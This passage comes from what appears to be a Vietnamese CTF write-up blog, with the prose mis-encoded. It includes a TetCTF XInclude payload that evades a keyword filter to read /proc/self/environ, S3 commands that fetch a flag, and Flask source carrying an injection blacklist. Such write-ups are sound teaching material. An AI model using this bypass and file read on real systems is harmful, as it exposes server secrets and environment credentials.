<p>V·∫≠y l√† ta th·∫•y th√™m m·ªôt bucket n·ªØa t√™n l√† <code class="language-plaintext highlighter-rouge">tet-ctf-secret</code>, ki·ªÉm tra xem tr√™n ƒë√≥ c√≥ g√¨:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws s3 <span class="nb">ls </span>s3://tet-ctf-secret
<span class="go">2021-12-29 22:18:42         29 flag
</span></code></pre></div></div>

<p>C√≥ file flag, th·ª≠ l·∫•y n√≥ v·ªÅ v√† ƒë·ªçc:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>aws s3 <span class="nb">cp </span>s3://tet-ctf-secret/flag flag
<span class="go">download: s3://tet-ctf-secret/flag to ./flag 

</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>flag
<span class="go">TetCTF{AssumE_R0le-iS-A-MuSt}
</span></code></pre></div></div>

<p>Done, flag: <code class="language-plaintext highlighter-rouge">TetCTF{AssumE_R0le-iS-A-MuSt}</code></p>

<blockquote>
  <p>C·∫£m ∆°n anh Chi Tran, ƒë·ªìng th·ªùi l√† ng∆∞·ªùi ra ƒë·ªÅ c·ªßa chall n√†y, ƒë√£ cho em m∆∞·ª£n IAM User v√† ch·ªâ d·∫´n em trong qu√° tr√¨nh gi·∫£i, c≈©ng nh∆∞ l√† h·ªçc th√™m ki·∫øn th·ª©c m·ªõi!</p>
</blockquote>]]></content><author><name></name></author><summary type="html"><![CDATA[Picked onion]]></summary></entry><entry><title type="html">TetCTF 2022 | Web Exploitation | 2X-Service</title><link href="/2022/01/03/TetCTF-2x-service.html" rel="alternate" type="text/html" title="TetCTF 2022 | Web Exploitation | 2X-Service" /><published>2022-01-03T00:33:00+00:00</published><updated>2022-01-03T00:33:00+00:00</updated><id>/2022/01/03/TetCTF-2x-service</id><content type="html" xml:base="/2022/01/03/TetCTF-2x-service.html"><![CDATA[<h1 id="2x-service">2X-Service</h1>

<p><img src="https://user-images.githubusercontent.com/82533607/147850702-16a63ccc-ba1d-4543-81ac-4aa052659960.png" alt="2x-service" /></p>

<blockquote>
  <p>Well, ƒë√¢y l√† b√†i duy nh·∫•t m√† t√¥i gi·∫£i ƒë∆∞·ª£c trong 2 ng√†y TetCTF, v·∫´n c√≤n non qu√° m√† :(((</p>
</blockquote>

<h2 id="source-code--analysis">Source code &amp; analysis</h2>

<h3 id="source-code">Source code:</h3>

<p>ƒê√¢y l√† source code c·ªßa <code class="language-plaintext highlighter-rouge">app.py</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">request</span>
<span class="kn">from</span> <span class="nn">flask_socketio</span> <span class="kn">import</span> <span class="n">SocketIO</span><span class="p">,</span> <span class="n">emit</span><span class="p">,</span> <span class="n">send</span>
<span class="kn">from</span> <span class="nn">xml.etree</span> <span class="kn">import</span> <span class="n">ElementTree</span><span class="p">,</span> <span class="n">ElementInclude</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'XXXXXXXSECREKTXXXXXXXX'</span>
<span class="n">socketio</span> <span class="o">=</span> <span class="n">SocketIO</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
	<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'dashboard'</span><span class="p">))</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">dashboard</span><span class="p">():</span>
	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'./dashboard.html'</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/source'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">source</span><span class="p">():</span>
	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'source.html'</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/about'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">about</span><span class="p">():</span>
	<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'about.html'</span><span class="p">)</span>


<span class="o">@</span><span class="n">socketio</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="s">'message'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">handle_message</span><span class="p">(</span><span class="n">xpath</span><span class="p">,</span> <span class="n">xml</span><span class="p">):</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">xpath</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">xml</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="s">"text"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">xml</span><span class="p">.</span><span class="n">lower</span><span class="p">():</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">res</span> <span class="o">=</span> <span class="s">''</span>
			<span class="n">root</span> <span class="o">=</span> <span class="n">ElementTree</span><span class="p">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">xml</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
			<span class="n">ElementInclude</span><span class="p">.</span><span class="n">include</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
			<span class="k">for</span> <span class="n">elem</span> <span class="ow">in</span> <span class="n">root</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">xpath</span><span class="p">):</span>
				<span class="k">if</span> <span class="n">elem</span><span class="p">.</span><span class="n">text</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
					<span class="n">res</span> <span class="o">+=</span> <span class="n">elem</span><span class="p">.</span><span class="n">text</span> <span class="o">+</span> <span class="s">", "</span>
			<span class="n">emit</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="n">res</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">])</span>
		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
			<span class="n">emit</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="s">'Nani?'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">emit</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="s">'Nani?'</span><span class="p">)</span>


<span class="o">@</span><span class="n">socketio</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="s">'my event'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">handle_my_custom_event</span><span class="p">(</span><span class="n">json</span><span class="p">):</span>
	<span class="k">print</span><span class="p">(</span><span class="s">'received json: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">json</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">socketio</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8003</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="analysis">Analysis</h3>

<p>·ªû b√†i n√†y s·ª≠ d·ª•ng websocket th√¥ng qua <code class="language-plaintext highlighter-rouge">flask-socketio</code>, nh√¨n qua source code c·ªßa <code class="language-plaintext highlighter-rouge">/dardboard</code> ta th·∫•y c√≥ <code class="language-plaintext highlighter-rouge">jquery</code> v√† <code class="language-plaintext highlighter-rouge">socketio</code> ƒë∆∞·ª£c import s·∫µn, nh∆∞ng ch∆∞a kh·ªüi t·∫°o <code class="language-plaintext highlighter-rouge">socket</code>:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"static/css/tsu.css"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"static/js/jquery.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"static/js/socket.io.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"static/js/tsu.js"</span><span class="nt">&gt;&lt;/script&gt;</span>


<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>

  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"header"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#default"</span> <span class="na">class=</span><span class="s">"logo"</span><span class="nt">&gt;</span>2X-Service<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"header-right"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"active"</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span>
      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/source"</span><span class="nt">&gt;</span>Source<span class="nt">&lt;/a&gt;</span>
      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;body&gt;</span>

<span class="nt">&lt;br&gt;&lt;br&gt;</span>
<span class="nt">&lt;center&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form"</span> <span class="nt">&gt;</span>
	    <span class="nt">&lt;label&gt;</span>XPATH<span class="nt">&lt;/label&gt;&lt;br&gt;</span>
	    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"xpath"</span> <span class="na">placeholder=</span><span class="s">"Ex: attribute"</span><span class="nt">&gt;&lt;br&gt;</span>

	    <span class="nt">&lt;label&gt;</span>XML<span class="nt">&lt;/label&gt;</span>
	    <span class="nt">&lt;textarea</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"xml"</span> <span class="na">rows=</span><span class="s">"25"</span> <span class="na">placeholder=</span><span class="s">"Ex:&amp;#10;&lt;person&gt;&amp;#10;&lt;name&gt;tsu&lt;/name&gt;&amp;#10;&lt;attribute&gt;deptrai&lt;/attribute&gt;&amp;#10;&lt;/person&gt;"</span> <span class="nt">&gt;&lt;/textarea&gt;</span>
	  
	    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">id=</span><span class="s">"process"</span> <span class="na">value=</span><span class="s">"Process"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/center&gt;</span>
</code></pre></div></div>

<p>V√¨ v·∫≠y, ƒë·ªÉ g·ª≠i ƒë∆∞·ª£c request t·ª´ client ƒë·∫øn socket t·∫°i server, ta c·∫ßn thi·∫øt l·∫≠p socket, sau khi ƒë·ªçc qua doc c·ªßa <code class="language-plaintext highlighter-rouge">flask-socket</code>, m√¨nh ƒë√£ t·∫°o ra ƒëo·∫°n code <code class="language-plaintext highlighter-rouge">jquery</code> nh∆∞ sau:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Define the socket</span>
<span class="nx">socket</span> <span class="o">=</span> <span class="nx">io</span><span class="p">()</span>
<span class="c1">// Connect to server's socket</span>
<span class="nx">socket</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://207.148.119.136:8003</span><span class="dl">'</span><span class="p">)</span>
<span class="c1">// Test connection:</span>
<span class="nx">socket</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">connect</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">hello?</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">hi</span><span class="dl">'</span><span class="p">)</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">socket</span><span class="p">.</span><span class="nx">connected</span><span class="p">)</span>
<span class="p">})</span>
<span class="c1">// Listen to response, then log to console</span>
<span class="nx">socket</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">result</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="p">});</span>
<span class="c1">// Submit form's content to server's socket</span>
<span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.form</span><span class="dl">'</span><span class="p">).</span><span class="nx">submit</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#xpath</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">(),</span> <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#xml</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">())</span>
<span class="p">})</span>
</code></pre></div></div>

<p>Test th·ª≠ xem sao:</p>

<p><img src="https://user-images.githubusercontent.com/82533607/147850835-c6220de1-ba84-482b-b38f-da04f3c15ecc.png" alt="socket_connected" /></p>

<p>V·∫≠y l√† ƒë√£ xong ph·∫ßn socket, b√¢y gi·ªù c·∫ßn ph√¢n t√≠ch source code m·ªôt ch√∫t, c·ª• th·ªÉ l√† ph·∫ßn <code class="language-plaintext highlighter-rouge">message</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">socketio</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="s">'message'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">handle_message</span><span class="p">(</span><span class="n">xpath</span><span class="p">,</span> <span class="n">xml</span><span class="p">):</span>
	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">xpath</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">xml</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="s">"text"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">xml</span><span class="p">.</span><span class="n">lower</span><span class="p">():</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">res</span> <span class="o">=</span> <span class="s">''</span>
			<span class="n">root</span> <span class="o">=</span> <span class="n">ElementTree</span><span class="p">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">xml</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
			<span class="n">ElementInclude</span><span class="p">.</span><span class="n">include</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
			<span class="k">for</span> <span class="n">elem</span> <span class="ow">in</span> <span class="n">root</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">xpath</span><span class="p">):</span>
				<span class="k">if</span> <span class="n">elem</span><span class="p">.</span><span class="n">text</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
					<span class="n">res</span> <span class="o">+=</span> <span class="n">elem</span><span class="p">.</span><span class="n">text</span> <span class="o">+</span> <span class="s">", "</span>
			<span class="n">emit</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="n">res</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">])</span>
		<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
			<span class="n">emit</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="s">'Nani?'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">emit</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="s">'Nani?'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="exploit">Exploit</h2>

<p>ƒê·ªçc qua th√¨ s·∫Ω th·∫•y ph·∫ßn n√†y kh√° gi·ªëng b√†i <a href="https://dauhoangtai.github.io/ctf/2021/11/13/WRITEUP-SVATTT-FINAL-2021-WEB.html#challenge-x-service">X-Service</a> c·ªßa v√≤ng chung k·∫øt SVATTT 2021.</p>

<p>Ta c√≥ th·ªÉ s·ª≠ d·ª•ng payload sau:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.0'?&gt;</span>
<span class="nt">&lt;document</span> <span class="na">xmlns:xi=</span><span class="s">"http://www.w3.org/2001/XInclude"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xi:include</span> <span class="na">href=</span><span class="s">"path_of_the_file"</span> <span class="na">parse=</span><span class="s">"text"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/document&gt;</span>
</code></pre></div></div>

<p>Nh∆∞ng c√≥ m·ªôt v·∫•n ƒë·ªÅ l√†, <code class="language-plaintext highlighter-rouge">text</code> b·ªã filter, sau khi ƒë·ªçc qua doc c·ªßa <a href="https://www.w3.org/TR/xinclude-11">xi:include</a> th√¨ m√¨nh nh·∫≠n ra r·∫±ng, ch·∫≥ng c√≥ <code class="language-plaintext highlighter-rouge">parser</code> n√†o c√≥ th·ªÉ gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ n√†y, v√¨ v·∫≠y, ch·ªâ c√≤n c√°ch l√†m th·∫ø n√†o ƒë·ªÉ <code class="language-plaintext highlighter-rouge">text</code> xu·∫•t hi·ªán m√† kh√¥ng b·ªã filter.</p>

<p>Th·ª±c ra m·ªçi chuy·ªán kh√° ƒë∆°n gi·∫£n, ch√∫ng ta c√≥ th·ªÉ d√πng ph∆∞∆°ng ph√°p <code class="language-plaintext highlighter-rouge">concat</code> nh∆∞ sau:</p>

<ul>
  <li>ƒê·∫ßu ti√™n, define 2 bi·∫øn <code class="language-plaintext highlighter-rouge">te</code> v√† <code class="language-plaintext highlighter-rouge">xt</code> th√¥ng qua <code class="language-plaintext highlighter-rouge">ENTITY</code></li>
</ul>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.0'?&gt;</span>
<span class="cp">&lt;!DOCTYPE resources [
  &lt;!ENTITY te "te"&gt;</span>
  <span class="cp">&lt;!ENTITY xt "xt"&gt;</span>
]&gt;
</code></pre></div></div>

<ul>
  <li>Ti·∫øp theo, s·ª≠ d·ª•ng 2 bi·∫øn ƒë√≥:</li>
</ul>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;document</span> <span class="na">xmlns:xi=</span><span class="s">"http://www.w3.org/2001/XInclude"</span><span class="nt">&gt;</span>
<span class="nt">&lt;p&gt;</span>
  <span class="nt">&lt;xi:include</span> <span class="na">href=</span><span class="s">"flag.txt"</span> <span class="na">parse=</span><span class="s">"&amp;te;&amp;xt;"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;/document&gt;</span>
</code></pre></div></div>

<blockquote>
  <p>&amp;te;&amp;xt; &lt;=&gt; ‚Äúte‚Äù + ‚Äúxt‚Äù = ‚Äútext‚Äù</p>
</blockquote>

<p>V√† ta c√≥ payload ho√†n ch·ªânh:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.0'?&gt;</span>
<span class="cp">&lt;!DOCTYPE resources [
  &lt;!ENTITY te "te"&gt;</span>
  <span class="cp">&lt;!ENTITY xt "xt"&gt;</span>
]&gt;

<span class="nt">&lt;document</span> <span class="na">xmlns:xi=</span><span class="s">"http://www.w3.org/2001/XInclude"</span><span class="nt">&gt;</span>
<span class="nt">&lt;p&gt;</span>
  <span class="nt">&lt;xi:include</span> <span class="na">href=</span><span class="s">"flag.txt"</span> <span class="na">parse=</span><span class="s">"&amp;te;&amp;xt;"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;/document&gt;</span>
</code></pre></div></div>

<p>S·ª≠ d·ª•ng <code class="language-plaintext highlighter-rouge">xpath = *</code>, ƒë·∫ßu ti√™n, th·ª≠ tr√™n local xem sao?</p>

<p><img src="https://user-images.githubusercontent.com/82533607/147851083-50c4ca78-6545-44eb-a839-51b320ac056b.png" alt="test" /></p>

<p>OK, v·∫≠y l√† payload ho·∫°t ƒë·ªông t·ªët, v·∫≠y th·ª≠ tr√™n server xem sao?</p>

<p><img src="https://user-images.githubusercontent.com/82533607/147851133-1ca3f3c1-3383-49ff-9735-fa62e78fe437.png" alt="test_server" /></p>

<p>Oh, v·∫≠y l√† file <code class="language-plaintext highlighter-rouge">flag.txt</code> c√≥ th·ªÉ kh√¥ng t·ªìn t·∫°i, v·∫≠y l√† n√≥ n·∫±m ·ªü ƒë√¢u?</p>

<p>Sau m·ªôt h·ªìi ‚Äúfuzzing b·∫±ng c∆°m‚Äù th√¨ t√¥i v√¥ t√¨nh t√¨m th·∫•y ƒë∆∞·ª£c flag t·∫°i <code class="language-plaintext highlighter-rouge">/proc/self/environ</code>:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.0'?&gt;</span>
<span class="cp">&lt;!DOCTYPE resources [
  &lt;!ENTITY te "te"&gt;</span>
  <span class="cp">&lt;!ENTITY xt "xt"&gt;</span>
]&gt;

<span class="nt">&lt;document</span> <span class="na">xmlns:xi=</span><span class="s">"http://www.w3.org/2001/XInclude"</span><span class="nt">&gt;</span>
<span class="nt">&lt;p&gt;</span>
  <span class="nt">&lt;xi:include</span> <span class="na">href=</span><span class="s">"/proc/self/environ"</span> <span class="na">parse=</span><span class="s">"&amp;te;&amp;xt;"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;/document&gt;</span>
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/82533607/147851230-9c48d2de-6d3e-44f0-a123-6e741fcbc1bd.png" alt="flag" /></p>

<p>Flag: <code class="language-plaintext highlighter-rouge">FLAG=TetCTF{Just_Warm_y0u_uP_:P__}</code></p>

<blockquote>
  <p>T·ª´ s√°ng ƒë·∫øn t·ªëi ch·ªâ ƒë·ªÉ gi·∫£i ƒë∆∞·ª£c 1 b√†i web duy nh·∫•t üòû</p>
</blockquote>]]></content><author><name></name></author><summary type="html"><![CDATA[2X-Service]]></summary></entry><entry><title type="html">FPTU SecAthon 2021 | Web Writeup | PRP202</title><link href="/2021/10/13/FuSec4-PRP202.html" rel="alternate" type="text/html" title="FPTU SecAthon 2021 | Web Writeup | PRP202" /><published>2021-10-13T05:30:00+00:00</published><updated>2021-10-13T05:30:00+00:00</updated><id>/2021/10/13/FuSec4-PRP202</id><content type="html" xml:base="/2021/10/13/FuSec4-PRP202.html"><![CDATA[<h1 id="prp202">PRP202</h1>

<blockquote>
  <p>M·ªôt b√†i hay v√† c·ª±c kh√≥ v·ªõi m√¨nh, ch·∫£ tr√°ch ng∆∞·ªùi anh T gi·∫•u t√™n c·ª© b·∫£o l√†m th·ª≠<br />
2 ng√†y ƒë·ªÉ l√†m, nhi·ªÅu l·∫ßn th·∫•t b·∫°i, nh∆∞ng k·∫øt qu·∫£ th·∫≠t x·ª©ng ƒë√°ng</p>
</blockquote>

<h2 id="source-code-and-analysis">Source code and analysis</h2>

<h3 id="source-code">Source code</h3>
<p>B·∫Øt ƒë·∫ßu v√†o b√†i, t·∫°i trang index, Ctrl U l√™n th·∫•y <a href="https://github.com/phucdc-noob/FUSec-Write-Ups/blob/main/PRP202.py">source code</a> Flask c·ªßa web</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span> <span class="n">template_folder</span><span class="o">=</span><span class="s">"template"</span><span class="p">)</span>
<span class="n">SESSION_TYPE</span> <span class="o">=</span> <span class="s">"filesystem"</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="n">from_object</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">Session</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
<span class="n">authCode</span> <span class="o">=</span> <span class="s">"C4n 1 Trust Y0u? Player "</span>


<span class="c1"># Our bot detected that some users had gained access to the system by malicious function, so we decided to ban it.
</span><span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s">"'"</span><span class="p">,</span> <span class="s">'"'</span><span class="p">,</span> <span class="s">"request"</span><span class="p">,</span> <span class="s">"readlines"</span><span class="p">,</span> <span class="s">"+"</span><span class="p">,</span> <span class="s">"%2b"</span><span class="p">,</span> <span class="s">"%22"</span><span class="p">,</span> <span class="s">"%27"</span><span class="p">,</span> <span class="s">"linecache"</span><span class="p">]</span>


<span class="k">def</span> <span class="nf">authCheck</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">""</span>
    <span class="k">return</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">session</span><span class="p">.</span><span class="n">pop</span><span class="p">(</span><span class="s">"userCode"</span><span class="p">)</span>
        <span class="n">session</span><span class="p">.</span><span class="n">pop</span><span class="p">(</span><span class="s">"winner"</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
        <span class="n">ok</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"ok"</span><span class="p">]</span>
        <span class="k">for</span> <span class="n">ban</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">ban</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"name"</span><span class="p">]:</span>
                <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s">"Hacker Alert!!!"</span><span class="p">)</span>
        <span class="n">session</span><span class="p">[</span><span class="s">"userCode"</span><span class="p">]</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"name"</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">ok</span> <span class="o">==</span> <span class="s">"Let's play!"</span><span class="p">:</span>
            <span class="n">session</span><span class="p">[</span><span class="s">"check"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"access"</span>
            <span class="c1"># bypass this? No way haha :D
</span>            <span class="n">winner</span> <span class="o">=</span> <span class="s">"cocailonditconbamay"</span>
            <span class="n">session</span><span class="p">[</span><span class="s">"winner"</span><span class="p">]</span> <span class="o">=</span> <span class="n">winner</span>
            <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span>
                <span class="s">"Generating winner hash...&lt;script&gt;setInterval(function(){ window.location='/doanxem'; }, 500);&lt;/script&gt;"</span>
            <span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">)</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/doanxem"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"POST"</span><span class="p">])</span>
